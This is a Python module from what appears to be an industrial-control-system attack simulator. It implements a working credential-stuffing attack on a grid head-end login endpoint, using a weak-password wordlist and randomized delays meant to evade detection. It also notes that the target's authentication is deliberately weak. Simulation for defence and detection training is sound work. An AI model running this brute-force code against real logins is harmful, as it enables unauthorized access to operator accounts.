"""
APT Simulator — Stage 2: Initial Access
=========================================
MITRE ATT&CK for ICS: T0859 — Valid Accounts

Simulates credential stuffing / brute-force attack against the HES
operator login portal. Tries a wordlist of common passwords against
known usernames until a valid credential pair is found.

The intentionally weak auth in hes/auth.py (no lockout, no rate
limiting) makes this attack succeed reliably.
"""

from __future__ import annotations

import asyncio
import logging
import random

import httpx

from shared import config
from shared.models import AttackStage
from attacker.event_log import EventLog

logger = logging.getLogger(__name__)

STAGE = AttackStage.INITIAL_ACCESS
TECHNIQUE_ID = "T0859"
TACTIC = "Initial Access"

# Default wordlist (common weak passwords)
DEFAULT_WORDLIST = [
    "password", "123456", "admin", "grid2024", "admin123",
    "operator", "test123", "welcome1", "changeme", "scada2024",
]

DEFAULT_USERS = ["operator1", "admin"]


async def execute(event_log: EventLog, stage_config: dict = None) -> dict:
    """
    Execute the Initial Access stage.
    
    Performs credential stuffing against the HES login endpoint.
    
    Returns:
        Dict with compromised credentials if successful
    """
    stage_config = stage_config or {}
    base_url = stage_config.get("target_url", config.HES_URL)
    login_endpoint = f"{base_url}/api/auth/login"
    wordlist = stage_config.get("wordlist", DEFAULT_WORDLIST)
    target_users = stage_config.get("target_users", DEFAULT_USERS)

    logger.info(f"[INITIAL ACCESS] Starting credential stuffing against {login_endpoint}")
    await event_log.log_event(
        stage=STAGE,
        technique_id=TECHNIQUE_ID,
        tactic=TACTIC,
        target=login_endpoint,
        action="Starting credential stuffing attack",
        details={
            "target_users": target_users,
            "wordlist_size": len(wordlist),
        },
    )

    compromised = None
    attempt_count = 0

    async with httpx.AsyncClient(timeout=5.0) as client:
        for username in target_users:
            for password in wordlist:
                attempt_count += 1

                try:
                    resp = await client.post(
                        login_endpoint,
                        json={"username": username, "password": password},
                    )

                    if resp.status_code == 200:
                        token = resp.json().get("token")
                        compromised = {
                            "username": username,
                            "password": password,
                            "token": token,
                        }

                        await event_log.log_event(
                            stage=STAGE,
                            technique_id=TECHNIQUE_ID,
                            tactic=TACTIC,
                            target=login_endpoint,
                            action=f"CREDENTIAL FOUND: {username}:{password}",
                            details={
                                "username": username,
                                "attempts": attempt_count,
                                "token_obtained": bool(token),
                            },
                        )

                        logger.warning(
                            f"[INITIAL ACCESS] *** CREDENTIAL FOUND: "
                            f"{username}:{password} (attempt #{attempt_count}) ***"
                        )
                        # Don't stop — try to find more credentials
                        # But in demo mode, we can break early
                        break
                    else:
                        await event_log.log_event(
                            stage=STAGE,
                            technique_id=TECHNIQUE_ID,
                            tactic=TACTIC,
                            target=login_endpoint,
                            action=f"Login attempt failed: {username}:{password}",
                            details={"attempt": attempt_count},
                            success=False,
                        )

                except httpx.ConnectError:
                    logger.error(f"[INITIAL ACCESS] Connection failed to {login_endpoint}")
                    await event_log.log_event(
                        stage=STAGE,
                        technique_id=TECHNIQUE_ID,
                        tactic=TACTIC,
                        target=login_endpoint,
                        action="Connection failed during credential stuffing",
                        success=False,
                    )
                    return {"success": False, "error": "connection_failed"}

                # Delay between attempts (attacker trying to avoid detection)
                await asyncio.sleep(random.uniform(0.3, 1.0))

            if compromised:
                break

    if compromised:
        summary = {
            "success": True,
            "username": compromised["username"],
            "token": compromised["token"],
            "total_attempts": attempt_count,
        }
    else:
        summary = {
            "success": False,
            "total_attempts": attempt_count,
        }
        await event_log.log_event(
            stage=STAGE,
            technique_id=TECHNIQUE_ID,
            tactic=TACTIC,
            target=login_endpoint,
            action=f"Credential stuffing failed after {attempt_count} attempts",
            success=False,
        )

    return summary
